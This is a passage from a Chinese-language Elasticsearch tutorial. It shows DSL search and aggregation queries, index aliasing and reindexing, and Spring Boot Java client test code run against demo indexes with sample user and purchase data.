可以用来合并多个条件查询结果的布尔逻辑，它包含以下操作符：\n\n*   must : 多个查询条件的完全匹配,相当于 and。\n\n*   must\\_not : 多个查询条件的相反匹配，相当于 not。\n\n*   should : 至少有一个查询条件匹配, 相当于 or。\n\n\n这些参数可以分别继承一个过滤条件或者一个过滤条件的数组：\n\n```\n\n\n#过滤搜索 bool   \n#must : 多个查询条件的完全匹配,相当于 and。  \n#must\\_not : 多个查询条件的相反匹配，相当于 not。  \n#should : 至少有一个查询条件匹配, 相当于 or。  \nGET \\_search  \n{  \n  \"query\": {  \n    \"bool\": {  \n      \"must\": \\[  \n        {  \n          \"term\": {  \n            \"city\": {  \n              \"value\": \"深圳\"  \n            }  \n          }  \n        },  \n        {  \n          \"range\":{  \n            \"age\":{  \n              \"gte\":20,  \n              \"lte\":99  \n            }  \n          }  \n        }  \n      \\]  \n    }  \n  }  \n}  \n\n\n\n```\n\n8.  **match\\_all 查询**\n\n\n可以查询到所有文档，是没有查询条件下的默认语句。\n\n```\n\n\n#查询所有 match\\_all  \nGET \\_search  \n{  \n  \"query\": {  \n    \"match\\_all\": {}  \n  }  \n}  \n\n\n\n```\n\n9.  **match 查询**\n\n\nmatch查询是一个标准查询，不管你需要全文本查询还是精确查询基本上都要用到它。如果你使用 match 查询一个全文本字段，它会在真正查询之前用分析器先分析match一下查询字符：\n\n```\n\n\n#字符串匹配  \nGET \\_search  \n{  \n  \"query\": {  \n    \"match\": {  \n      \"description\": \"武汉广州\"  \n    }  \n  }  \n}  \n\n\n\n```\n\n10.  **prefix 查询**\n\n\n以什么字符开头的，可以更简单地用 prefix ,例如查询所有以张开始的用户描述\n\n```\n\n\n#前缀匹配 prefix  \nGET \\_search  \n{  \n  \"query\": {  \n    \"prefix\": {  \n      \"name\": {  \n        \"value\": \"赵\"  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n10.  **multi\\_match 查询**\n\n\nmulti\\_match查询允许你做match查询的基础上同时搜索多个字段，在多个字段中同时查一个\n\n```\n\n\n#多个域匹配搜索  \nGET \\_search  \n{  \n  \"query\": {  \n    \"multi\\_match\": {  \n      \"query\": \"深圳\",  \n      \"fields\": \\[  \n        \"city\",  \n        \"description\"  \n      \\]  \n    }  \n  }  \n}  \n\n\n\n```\n\n11.  **filter**\n\n\n因为过滤可以使用缓存，同时不计算分数，通常的规则是，使用查询（query）语句来进行 全文 搜索或者其它任何需要影响 相关性得分 的搜索。除此以外的情况都使用过滤（filters)\n\n```\n\n\nGET /user/\\_search  \n{  \n  \"query\": {  \n    \"bool\": {  \n      \"filter\": {  \n         \"range\":{  \n          \"age\":{  \n            \"gte\":25,  \n            \"lte\": 80  \n          }  \n        }  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n完整DSL案例代码如下：\n\n```\n\n\n  \nGET \\_cat/health?v  \n  \nGET \\_cat/nodes?v  \n  \nGET \\_cat/indices?v  \n  \nDELETE /user  \n  \nPUT /user  \n  \n  \nPUT /user/\\_mapping  \n{  \n  \"properties\": {  \n    \"name\":{  \n      \"type\": \"text\",  \n      \"analyzer\": \"ik\\_smart\",  \n      \"search\\_analyzer\": \"ik\\_smart\"  \n    },  \n    \"city\":{  \n      \"type\": \"text\",  \n      \"analyzer\": \"ik\\_smart\",  \n      \"search\\_analyzer\": \"ik\\_smart\"  \n    },  \n    \"age\":{  \n      \"type\": \"long\"  \n    },  \n    \"description\":{  \n      \"type\": \"text\",  \n      \"analyzer\": \"ik\\_smart\",  \n      \"search\\_analyzer\": \"ik\\_smart\"  \n    }  \n  }  \n}  \n  \nPUT /user/\\_doc/1  \n{  \n  \"name\":\"李四\",  \n  \"age\":22,  \n  \"city\":\"深圳\",  \n  \"description\":\"李四来自湖北武汉！\"  \n}  \n  \n  \n#新增文档数据 id=2  \nPUT /user/\\_doc/2  \n{  \n  \"name\":\"王五\",  \n  \"age\":35,  \n  \"city\":\"深圳\",  \n  \"description\":\"王五家住在深圳！\"  \n}  \n  \n#新增文档数据 id=3  \nPUT /user/\\_doc/3  \n{  \n  \"name\":\"张三\",  \n  \"age\":19,  \n  \"city\":\"深圳\",  \n  \"description\":\"在深圳打工，来自湖北武汉\"  \n}  \n  \n#新增文档数据 id=4  \nPUT /user/\\_doc/4  \n{  \n  \"name\":\"张三丰\",  \n  \"age\":66,  \n  \"city\":\"武汉\",  \n  \"description\":\"在武汉读书，家在武汉！\"  \n}  \n  \n#新增文档数据 id=5  \nPUT /user/\\_doc/5  \n{  \n  \"name\":\"赵子龙\",  \n  \"age\":77,  \n  \"city\":\"广州\",  \n  \"description\":\"赵子龙来自深圳宝安，但是在广州工作！\",  \n  \"address\":\"广东省茂名市\"  \n}  \n  \n#新增文档数据 id=6  \nPUT /user/\\_doc/6  \n{  \n  \"name\":\"赵毅\",  \n  \"age\":55,  \n  \"city\":\"广州\",  \n  \"description\":\"赵毅来自广州白云区，从事电子商务8年！\"  \n}  \n  \n#新增文档数据 id=7  \nPUT /user/\\_doc/7  \n{  \n  \"name\":\"赵哈哈\",  \n  \"age\":57,  \n  \"city\":\"武汉\",  \n  \"description\":\"武汉赵哈哈，在深圳打工已有半年了，月薪7500！\"  \n}  \n  \n  \nGET /user/\\_doc/4  \n  \n  \n#更新数据,id=4  \nPUT /user/\\_doc/4  \n{  \n  \"name\":\"张三丰\",  \n  \"description\":\"在武汉读书，家在武汉！在深圳工作！\"  \n}  \n  \nPUT /user/\\_doc/4  \n{  \n  \"name\":\"张三丰\",  \n  \"age\":66,  \n  \"city\":\"武汉\",  \n  \"description\":\"在武汉读书，家在武汉！\"  \n}  \n  \n#使用POST更新某个域的数据  \nPOST /user/\\_doc/4  \n{  \n  \"doc\":{  \n    \"name\":\"张三丰\",  \n    \"description\":\"在武汉读书，家在武汉！在深圳工作！\"  \n  }  \n}  \n  \nGET /user/\\_search  \n  \nGET /user/\\_doc/2  \n  \n#搜索排序  \nGET /user/\\_search  \n{  \n  \"query\":{  \n    \"match\\_all\": {}  \n  },  \n  \"sort\":{  \n    \"age\":{  \n      \"order\":\"desc\"  \n    }  \n  }  \n}  \n  \n#分页实现  \nGET /user/\\_search  \n{  \n  \"query\":{  \n    \"match\\_all\": {}  \n  },  \n  \"sort\":{  \n    \"age\":{  \n      \"order\":\"desc\"  \n    }  \n  },  \n  \"from\": 0,  \n  \"size\": 2  \n}  \n  \n#查询-term  \nGET \\_search  \n{  \n  \"query\":{  \n    \"term\":{  \n      \"city\":\"武汉\"  \n    }  \n  }  \n}  \n  \n#查询-terms 允许多个Term  \nGET \\_search  \n{  \n  \"query\":{  \n    \"terms\":{  \n      \"city\":  \n        \\[  \n          \"武汉\",  \n          \"广州\"  \n        \\]  \n    }  \n  }  \n}  \n  \nGET \\_search  \n{  \n  \"query\": {  \n    \"match\": {  \n      \"city\": \"广州武汉\"  \n    }  \n  }  \n}    \n  \nGET \\_search  \n{  \n  \"query\": {  \n    \"query\\_string\": {  \n      \"default\\_field\": \"city\",  \n      \"query\": \"广州武汉\"  \n    }  \n  }  \n}  \n  \n#-range 范围过滤  \n#gt表示> gte表示=>  \n#lt表示< lte表示<=  \nGET \\_search  \n{  \n  \"query\":{  \n    \"range\": {  \n      \"age\": {  \n        \"gte\": 30,  \n        \"lte\": 57  \n      }  \n    }  \n  }  \n}  \n  \n#搜索 exists：是指包含某个域的数据检索  \nGET \\_search  \n{  \n  \"query\": {  \n    \"exists\":{  \n      \"field\":\"address\"  \n    }  \n  }  \n}  \n  \nGET /user/\\_search  \n#过滤搜索 bool   \n#must : 多个查询条件的完全匹配,相当于 and。  \n#must\\_not : 多个查询条件的相反匹配，相当于 not。  \n#should : 至少有一个查询条件匹配, 相当于 or。  \nGET \\_search  \n{  \n  \"query\": {  \n    \"bool\": {  \n      \"must\": \\[  \n        {  \n          \"term\": {  \n            \"city\": {  \n              \"value\": \"深圳\"  \n            }  \n          }  \n        },  \n        {  \n          \"range\":{  \n            \"age\":{  \n              \"gte\":20,  \n              \"lte\":99  \n            }  \n          }  \n        }  \n      \\]  \n    }  \n  }  \n}  \n  \n#查询所有 match\\_all  \nGET \\_search  \n{  \n  \"query\": {  \n    \"match\\_all\": {}  \n  }  \n}  \n  \n#字符串匹配  \nGET \\_search  \n{  \n  \"query\": {  \n    \"match\": {  \n      \"description\": \"武汉广州\"  \n    }  \n  }  \n}  \n  \n#前缀匹配 prefix  \nGET \\_search  \n{  \n  \"query\": {  \n    \"prefix\": {  \n      \"name\": {  \n        \"value\": \"赵\"  \n      }  \n    }  \n  }  \n}  \n  \n#多个域匹配搜索  \nGET \\_search  \n{  \n  \"query\": {  \n    \"multi\\_match\": {  \n      \"query\": \"深圳\",  \n      \"fields\": \\[  \n        \"city\",  \n        \"description\"  \n      \\]  \n    }  \n  }  \n}  \n  \n  \nGET /user/\\_search  \n{  \n  \"query\": {  \n    \"bool\": {  \n      \"filter\": {  \n         \"range\":{  \n          \"age\":{  \n            \"gte\":25,  \n            \"lte\": 80  \n          }  \n        }  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n4.4 使用别名\n--------\n\n在mysql中 我们经常遇到产品修改需求 我们可能会在原有数据库表基础上 对字段 索引 类型进行修改比如 增加一个字段 添加一个字段的索引 又或者修改某个字段的类型，这一切都看起来这么自然 不过在ES这里却是行不通的 ES的mapping一旦设置了之后，可以改，但是改了没有用，因为ES默认是对所有字段进行索引 如果你修改了mapping 那么已经索引过的数据就必须全部重新索引一遍 , ES没有提供这个机制, 只能利用别名手工刷数据，\n\n1.  **添加索引别名**\n\n\n```\n\n\nPUT article1/\\_alias/article  \n{  \n\"acknowledged\" : true  \n}  \n\n\n\n```\n\n2.  **创建新article2索引（增加了一个owner字段）**\n\n\n```\n\n\nPUT article2  \n{  \n\t\"settings\": {  \n\t\t\"number\\_of\\_shards\": 3,  \n\t\t\"number\\_of\\_replicas\": 1 ,  \n\t\t\"analysis\" : {  \n\t\t\t\"analyzer\" : {  \n\t\t\t\t\"ik\" : {  \n\t\t\t\t\t\"tokenizer\" : \"ik\\_max\\_word\"  \n\t\t\t\t}  \n\t\t\t}  \n\t\t}  \n\t},  \n\t\"mappings\": {  \n\t\t\"properties\": {  \n\t\t\t\"id\": {  \n\t\t\t\t\"type\": \"keyword\"  \n\t\t\t},  \n\t\t\t\"title\": {  \n\t\t\t\t\"type\": \"text\",  \n\t\t\t\t\"analyzer\": \"ik\\_max\\_word\"  \n\t\t\t},  \n\t\t\t\"content\": {  \n\t\t\t\t\"type\": \"text\",  \n\t\t\t\t\"analyzer\": \"ik\\_max\\_word\"  \n\t\t\t},  \n\t\t\t\"viewCount\": {  \n\t\t\t\t\"type\": \"integer\"  \n\t\t\t},  \n\t\t\t\"creatDate\": {  \n\t\t\t\t\"type\": \"date\",  \n\t\t\t\t\"format\": \"yyyy-MM-dd HH:mm:ss||yyyy-MM-dd||epoch\\_millis\"  \n\t\t\t},  \n\t\t\t\"tags\": {  \n\t\t\t\t\"type\": \"keyword\"  \n\t\t\t},   \n\t\t\t\"owner\": {  \n\t\t\t\t\"type\": \"keyword\"  \n\t\t\t}  \n\t\t}  \n\t}  \n}  \n\n\n\n```\n\n3.  **重建索引 reindex**\n\n\n```\n\n\nPOST \\_reindex  \n{  \n\t\"source\": {  \n\t\t\"index\": \"article1\"  \n\t},  \n\t\"dest\": {  \n\t\t\"index\": \"article2\"  \n\t}  \n}  \n\n\n\n```\n\n4.  **修改别名映射**\n\n\n```\n\n\nPOST /\\_aliases  \n{  \n\t\"actions\": \\[  \n\t{  \n\t\t\"remove\": {  \n\t\t\t\"index\": \"article1\",  \n\t\t\t\"alias\": \"article\"  \n\t\t}  \n\t},  \n\t{  \n\t\t\"add\": {  \n\t\t\t\"index\": \"article2\",  \n\t\t\t\"alias\": \"article\"  \n\t\t}  \n\t}  \n\t\\]  \n}  \n\n\n\n```\n\n5.  使用别名搜索\n\n\n```\n\n\nGET /article/\\_search  \n{  \n    \"query\": {  \n    \t\"match\\_all\": {}  \n    }  \n}  \n\n\n\n```\n\n5 从0开始，ES工业级Java 应用开发\n=====================\n\n5.1 High Level Client基本用法\n-------------------------\n\nHigh Level Client客户端是构建于 Low Level Client之上的封装。\n\n类似于Hibernate和JDBC的关系。\n\n使用Spring Data ElasticSearch访问ElastiSearch,注意版本对应关系\n\n![](./2024/06/16/ES从入门到精通/20.png)\nspring boot 2.6.1对应的ES版本\n![](./2024/06/16/ES从入门到精通/21.png)\nHigh Level Client客户端测试案例\n\n```\n\n\n@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.NONE)  \npublic class RestHighLevelClientTest  \n{  \n  \n    //用来操作 Elasticsearch 服务器的一个客户端对象类  \n    @Autowired  \n    private RestHighLevelClient restHLClient;  \n  \n    @ParameterizedTest  \n    @ValueSource(ints = {1, 2, 3})  \n    void testWithSimpleValueSource(int argument) {  \n        System.out.println(\"Parameterized test with value: \" + argument);  \n    }  \n  \n    @Test  \n    @SneakyThrows  \n    void testWithSneakyThrows() {  \n        throw new Exception(\"This exception is sneaky thrown!\");  \n    }  \n  \n    @ParameterizedTest  \n    @CsvSource({\"1, 1, 2\", \"2, 3, 5\", \"3, 5, 8\"})  \n    void testAddition(int a, int b, int result) {  \n        int sum = a + b;  \n        Assertions.assertEquals(result, sum, \"Sum of \" + a + \" and \" + b + \" should be \" + result);  \n    }  \n  \n    //创建三个索引库  \n    @ParameterizedTest //参数测试  \n    @SneakyThrows  \n    @ValueSource(strings = {\"books\", \"items\", \"users\"})  \n    public void testCreateIndex(String indexName)  \n    {  \n  \n        //指定分词器创建索引库的json格式的数据，每一行用双引号包起来，然后里面的每个双引号前面用反斜杠\\\\转义  \n        String json = \"{\" +  \n                \"\\\\\"settings\\\\\": {\" +  \n                \"    \\\\\"analysis\\\\\": {\" +  \n                \"      \\\\\"analyzer\\\\\": {\" +  \n                \"        \\\\\"default\\\\\": {\" +  \n                \"           \\\\\"tokenizer\\\\\": \\\\\"ik\\_max\\_word\\\\\"\" +  \n                \"        }\" +  \n                \"      }\" +  \n                \"    }\" +  \n                \"  }\" +  \n                \"}\";  \n  \n        CreateIndexRequest request = new CreateIndexRequest(indexName)  \n                //参数1：指定创建索引库时要传入的参数  ； 参数2：指定传入内容的类型  \n                .source(json, XContentType.JSON);  \n        //创建索引库后返回的响应类型--CreateIndexResponse  \n        CreateIndexResponse resp = restHLClient.indices().create(request, RequestOptions.DEFAULT);  \n  \n        //获取Elasticsearch服务器的响应，就是响应索引库是否创建成功  \n        System.err.println(resp.isAcknowledged());  \n  \n    }  \n  \n  \n    //删除索引库  \n    @SneakyThrows  \n    @ParameterizedTest  \n    @ValueSource(strings = {\"items\", \"users\"})  \n    public void testDeleteIndex(String indexName)  \n    {  \n        //删除索引的请求数据  \n        DeleteIndexRequest request = new DeleteIndexRequest(indexName);  \n        //客户端调用操作索引的方法，然后再调用删除的方法  \n        AcknowledgedResponse resp = restHLClient.indices().delete(request, RequestOptions.DEFAULT);  \n        //查看删除后的响应  \n        System.err.println(resp.isAcknowledged());  \n    }  \n  \n    //查询所有的索引库  \n    @SneakyThrows  \n    @Test //这个测试不需要参数，直接用这个@Test注解即可  \n    public void testGetIndex()  \n    {  \n        //参数 \"\\*\" ： 表示匹配所有的索引库  \n        GetIndexRequest request = new GetIndexRequest(\"\\*\");  \n        //用rest客户端的方法来查询  \n        GetIndexResponse resp = restHLClient.indices().get(request, RequestOptions.DEFAULT);  \n        //返回的索引库是一个String类型的数组  \n        String\\[\\] indices = resp.getIndices();  \n        //把数组转成字符串  \n        String s = Arrays.toString(indices);  \n        System.err.println(s);  \n  \n  \n    }  \n  \n    //往索引库添加文档  \n  \n    @ParameterizedTest  \n    @SneakyThrows  \n    //测试参数有多个值 ，用这个注解  \n    @CsvSource({  \n            \"1,火影忍者,旋涡鸣人成长为第七代火影的故事,150\",  \n            \"2,家庭教师,废材纲成长为十代首领的热血事迹,200\",  \n            \"4,七龙珠Z,超级赛亚人贝吉塔来到地球后的热闹景象,400\"  \n    })  \n    public void testSaveDocument(Integer id, String title, String description, Double price)  \n    {  \n        //表明向 books 索引库添加文档  \n        IndexRequest request = new IndexRequest(\"books\")  \n                .id(id + \"\")  \n                .source(  \n                        \"title\", title,  \n                        \"description\", description,  \n                        \"price\", price  \n                );  \n  \n        IndexResponse resp = restHLClient.index(request, RequestOptions.DEFAULT);  \n        System.err.println(resp);  \n  \n    }  \n  \n  \n    //根据文档的id获取文档  \n    @SneakyThrows  \n    @ParameterizedTest  \n    @ValueSource(ints = {1, 3})  \n    public void testGetDocumentById(Integer id)  \n    {  \n        //表明从 books 索引库获取文档  \n        GetRequest request = new GetRequest(\"books\")  \n                //表明根据指定的文档的id获取文档  \n                .id(id + \"\");  \n  \n        GetResponse resp = restHLClient.get(request, RequestOptions.DEFAULT);  \n  \n        System.err.println(resp);  \n  \n    }  \n  \n    //根据条件查询文档（普通关键字查询和通配符查询）  \n  \n    @SneakyThrows  \n    @ParameterizedTest  \n    @CsvSource({  \n            \"description,热\\*\",  \n            \"description,成长\"  \n    })  \n    public void testSearchDocument(String field, String term)  \n    {  \n        // 构建查询条件的类  \n        SearchSourceBuilder builder = new SearchSourceBuilder();  \n  \n        // 通过 SearchSourceBuilder 可以用面向对象的方式来构建查询的 JSON 字符串  \n        // SearchSourceBuilder 需要传入 QueryBuilders，而 QueryBuilders 用于构建 QueryBuilder  \n        if (term != null && term.contains(\"\\*\"))  \n        {  \n            //根据字段和通配符关键字查询  \n            builder.query(QueryBuilders.wildcardQuery(field, term));  \n        } else  \n        {  \n            //根据字段和普通关键字查询  \n            builder.query(QueryBuilders.matchQuery(field,term));  \n        }  \n  \n        //表明从 books 索引库查询文档  \n        SearchRequest request = new SearchRequest(\"books\")  \n                // 此处的 builder 参数用于构建查询语法  \n                .source(builder);  \n  \n        //客户端调用查询的方法 ， 参数1：查询条件语法  参数2：默认的请求选项，比如超时时间之类的  \n        SearchResponse resp = restHLClient.search(request, RequestOptions.DEFAULT);  \n  \n        System.err.println(resp);  \n  \n    }  \n  \n  \n    //根据 id 删除文档  \n  \n    @ParameterizedTest  \n    @SneakyThrows  \n    @ValueSource(ints = {3,4})  \n    public void testDeleteDocumentById(Integer id)  \n    {  \n        //表明从 books 索引库删除文档  \n        DeleteRequest request = new DeleteRequest(\"books\")  \n                //获取指定id的文档  \n                .id(id+\"\");  \n        //rest客户端调用删除文档的方法  \n        DeleteResponse resp = restHLClient.delete(request, RequestOptions.DEFAULT);  \n        System.err.println(resp);  \n    }  \n  \n  \n  \n}  \n  \n\n\n\n```\n\n5.2 聚合查询\n--------\n\n### 5.2.1 DSL聚合查询\n\n1.  创建测试索引\n\n\n```\n\n\nPUT /jh\\_test  \n{  \n\t\"settings\": {},  \n\t\"mappings\": {  \n\t\t\"properties\": {  \n\t\t\t\"name\": {  \n\t\t\t\t\"type\": \"text\",  \n                \"fields\": {  \n                    \"keyword\": {  \n                        \"type\": \"keyword\",  \n                        \"ignore\\_above\": 256  \n                    }  \n                }  \n\t\t\t},  \n\t\t\t\"sex\": {  \n\t\t\t\t\"type\": \"keyword\"  \n\t\t\t},  \n\t\t\t\"buyCount\": {  \n\t\t\t\t\"type\": \"long\"  \n\t\t\t},  \n            \"createMonth\":{  \n                \"type\":\"keyword\"  \n            }  \n\t\t}  \n\t}  \n}  \n  \n\n\n\n```\n\n其中字段的含义为：name：姓名、buyCount：购买数量，sex：性别，createMonth：创建月 添加测试数据\n\n```\n\n\nPOST /jh\\_test/\\_doc/1  \n{\"name\":\"张三\",\"buyCount\":5,\"sex\":\"男\",\"createMonth\":\"2021-01\"}  \nPOST /jh\\_test/\\_doc/2  \n{\"name\":\"李四\",\"buyCount\":5,\"sex\":\"男\",\"createMonth\":\"2021-01\"}  \nPOST /jh\\_test/\\_doc/3  \n{\"name\":\"小卷\",\"buyCount\":18,\"sex\":\"女\",\"createMonth\":\"2021-01\"}  \nPOST /jh\\_test/\\_doc/4  \n{\"name\":\"小明\",\"buyCount\":6,\"sex\":\"女\",\"createMonth\":\"2021-01\"}  \nPOST /jh\\_test/\\_doc/5  \n{\"name\":\"张三\",\"buyCount\":3,\"sex\":\"男\",\"createMonth\":\"2021-02\"}  \nPOST /jh\\_test/\\_doc/6  \n{\"name\":\"王五\",\"buyCount\":8,\"sex\":\"男\",\"createMonth\":\"2021-02\"}  \nPOST /jh\\_test/\\_doc/7  \n{\"name\":\"赵四\",\"buyCount\":4,\"sex\":\"男\",\"createMonth\":\"2021-02\"}  \nPOST /jh\\_test/\\_doc/8  \n{\"name\":\"诸葛亮\",\"buyCount\":6,\"sex\":\"男\",\"createMonth\":\"2021-02\"}  \nPOST /jh\\_test/\\_doc/9  \n{\"name\":\"黄忠\",\"buyCount\":9,\"sex\":\"男\",\"createMonth\":\"2021-03\"}  \nPOST /jh\\_test/\\_doc/10  \n{\"name\":\"李白\",\"buyCount\":1,\"sex\":\"男\",\"createMonth\":\"2021-03\"}  \nPOST /jh\\_test/\\_doc/11  \n{\"name\":\"赵四\",\"buyCount\":3,\"sex\":\"男\",\"createMonth\":\"2021-03\"}  \nPOST /jh\\_test/\\_doc/12  \n{\"name\":\"张三\",\"buyCount\":2,\"sex\":\"男\",\"createMonth\":\"2021-03\"}  \nPOST /jh\\_test/\\_doc/13  \n{\"name\":\"李四\",\"buyCount\":6,\"sex\":\"男\",\"createMonth\":\"2021-04\"}  \nPOST /jh\\_test/\\_doc/14  \n{\"name\":\"王五\",\"buyCount\":9,\"sex\":\"男\",\"createMonth\":\"2021-04\"}  \nPOST /jh\\_test/\\_doc/15  \n{\"name\":\"李四\",\"buyCount\":4,\"sex\":\"男\",\"createMonth\":\"2021-04\"}  \nPOST /jh\\_test/\\_doc/16  \n{\"name\":\"王五\",\"buyCount\":2,\"sex\":\"男\",\"createMonth\":\"2021-04\"}  \n  \n\n\n\n```\n\n聚合查询语法：\n\n```\n\n\n\"aggs\" : {  \n    \"<aggregation\\_name>\" : {                                 <!--聚合名称 -->  \n        \"<aggregation\\_type>\" : {                             <!--聚合类型 -->  \n            <aggregation\\_body>                               <!--聚合具体字段 -->  \n        }  \n        \\[,\"meta\" : {  \\[<meta\\_data\\_body>\\] } \\]?                <!--元信息 -->  \n        \\[,\"aggs\" : { \\[<sub\\_aggregation>\\]+ } \\]?       <!--子聚合 -->  \n    }  \n}  \n  \n\n\n\n```\n\n1.  **查询 buyCount 的总和**\n\n\n```\n\n\nGET /jh\\_test/\\_search  \n{  \n  \"size\":0,  \n  \"aggs\":{  \n    \"buyCountSum\":{  \n      \"sum\": {  \n        \"field\": \"buyCount\"  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n2.  **查询 2021-02 月 buyCount 的总和**\n\n\n```\n\n\n{  \n  \"size\":0,  \n   \"query\": {  \n\t\t\"term\": {   \n            \"createMonth\": \"2021-02\"   \n        }  \n\t},  \n  \"aggs\":{  \n    \"buyCountSum\":{  \n      \"sum\": {  \n        \"field\": \"buyCount\"  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n3.  **查询 2021-03 月 buyCount 的最大值：**\n\n\n```\n\n\n{  \n  \"size\":0,  \n   \"query\": {  \n\t\t\"term\": {   \n            \"createMonth\": \"2021-03\"   \n        }  \n\t},  \n  \"aggs\":{  \n    \"buyCountMax\":{  \n      \"max\": {  \n        \"field\": \"buyCount\"  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n4.  **查询 2021-03 月 buyCount 的最小值：**\n\n\n```\n\n\n{  \n  \"size\":0,  \n   \"query\": {  \n\t\t\"term\": {   \n            \"createMonth\": \"2021-03\"   \n        }  \n\t},  \n  \"aggs\":{  \n    \"buyCountMin\":{  \n      \"min\": {  \n        \"field\": \"buyCount\"  \n      }  \n    }  \n  }  \n}  \n  \n\n\n\n```\n\n5.  **同时查询 2021-03 月 buyCount 的最大值和最小值：**\n\n\n```\n\n\n{  \n  \"size\":0,  \n   \"query\": {  \n\t\t\"term\": {   \n            \"createMonth\": \"2021-03\"   \n        }  \n\t},  \n  \"aggs\":{  \n    \"buyCountMax\":{  \n      \"max\": {  \n        \"field\": \"buyCount\"  \n      }  \n    },  \n     \"buyCountMin\":{  \n      \"min\": {  \n        \"field\": \"buyCount\"  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n6.  **查询所有 name 的去重后的数量**\n\n\n```\n\n\n{  \n  \"size\":0,  \n  \"aggs\":{  \n    \"distinctName\":{  \n      \"cardinality\": {  \n        \"field\": \"name.keyword\"  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n7.  **查询 2021-04 月 name 的去重后的数量**\n\n\n```\n\n\n{  \n  \"size\":0,  \n  \"query\": {  \n\t\t\"term\": {   \n            \"createMonth\": \"2021-04\"   \n        }  \n\t},  \n  \"aggs\":{  \n    \"distinctName\":{  \n      \"cardinality\": {  \n        \"field\": \"name.keyword\"  \n      }  \n    }  \n  }  \n}  \n  \n\n\n\n```\n\n8.  **查询 BuyCount 的平均值**\n\n\n```\n\n\n{  \n    \"size\":\"0\",  \n    \"aggs\":{  \n        \"buyCountAvg\":{  \n            \"avg\":{  \n                \"field\":\"buyCount\"  \n            }  \n        }  \n    }  \n}  \n  \n\n\n\n```\n\n9.  **一次查询 总数，最大值，最小值，平均值，总和**\n\n\n```\n\n\n{  \n  \"size\":0,  \n  \"aggs\":{  \n    \"statsAll\":{  \n      \"stats\":{  \n        \"field\":\"buyCount\"  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n10.  **根据 createMonth 分组查询每个月的最大 buyCount**\n\n\n```\n\n\n{  \n    \"size\":0,  \n    \"aggs\": {  \n    \"createMonthGroup\": {  \n      \"terms\": {  \n        \"field\": \"createMonth\"  \n      },  \n      \"aggs\": {  \n        \"buyCountMax\": {  \n          \"max\": {  \n            \"field\": \"buyCount\"  \n          }  \n        }  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n11.  **查询每 createMonth 下，根据 sex 区分，统计buyCount 的平均值**\n\n\n```\n\n\n{  \n    \"size\":0,  \n    \"aggs\": {  \n    \"createMonthGroup\": {  \n      \"terms\": {  \n        \"field\": \"createMonth\"  \n      },  \n      \"aggs\": {  \n        \"sexGroup\": {  \n          \"terms\": {  \n            \"field\": \"sex\"  \n          },  \n          \"aggs\": {  \n                \"buyCountAvg\": {  \n                    \"avg\": {  \n                        \"field\": \"buyCount\"  \n                    }  \n                }  \n            }  \n        }  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n### 5.2.2 ES客户端实现聚合查询\n\n测试代码如下：\n\n```\n\n\n@SpringBootTest  \n@Slf4j  \npublic class AggregationTest {  \n  \n    @Resource  \n    ElasticsearchRestTemplate elasticsearchRestTemplate;  \n  \n    /\\*\\*  \n     \\* 查询 buyCount 的总和  \n     \\*/  \n    @Test  \n    void aggs1() {  \n        SumAggregationBuilder buyCountSum = AggregationBuilders.sum(\"buyCountSum\").field(\"buyCount\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withAggregations(buyCountSum)  \n//                .addAggregation(buyCountSum)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Sum sum = aggregations.get(\"buyCountSum\");  \n                log.info(\"计算 buyCount 总数：{} \", sum.getValue());  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\* 查询 2021-02 月 buyCount 的总和：  \n     \\*/  \n    @Test  \n    void aggs2() {  \n        QueryBuilder queryBuilder = QueryBuilders.termQuery(\"createMonth\", \"2021-02\");  \n        SumAggregationBuilder buyCountSum = AggregationBuilders.sum(\"buyCountSum\").field(\"buyCount\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withQuery(queryBuilder)  \n                .withAggregations(buyCountSum)  \n//                .addAggregation(buyCountSum)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Sum sum = aggregations.get(\"buyCountSum\");  \n                log.info(\"计算 buyCount 总数：{} \", sum.getValue());  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\* 查询 2021-03 月 buyCount 的最大值：  \n     \\*/  \n    @Test  \n    void aggs3() {  \n        QueryBuilder queryBuilder = QueryBuilders.termQuery(\"createMonth\", \"2021-03\");  \n        MaxAggregationBuilder buyCountMax = AggregationBuilders.max(\"buyCountMax\").field(\"buyCount\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withQuery(queryBuilder)  \n                .withAggregations(buyCountMax)  \n//                .addAggregation(buyCountMax)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Max max = aggregations.get(\"buyCountMax\");  \n                log.info(\"计算 buyCount 最大值：{} \", max.getValue());  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\* 查询 2021-03 月 buyCount 的最小值：  \n     \\*/  \n    @Test  \n    void aggs4() {  \n        QueryBuilder queryBuilder = QueryBuilders.termQuery(\"createMonth\", \"2021-03\");  \n        MinAggregationBuilder buyCountMin = AggregationBuilders.min(\"buyCountMin\").field(\"buyCount\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withQuery(queryBuilder)  \n                .withAggregations(buyCountMin)  \n//                .addAggregation(buyCountMin)  \n                .build();  \n        SearchHits<JhTestEntity> search = 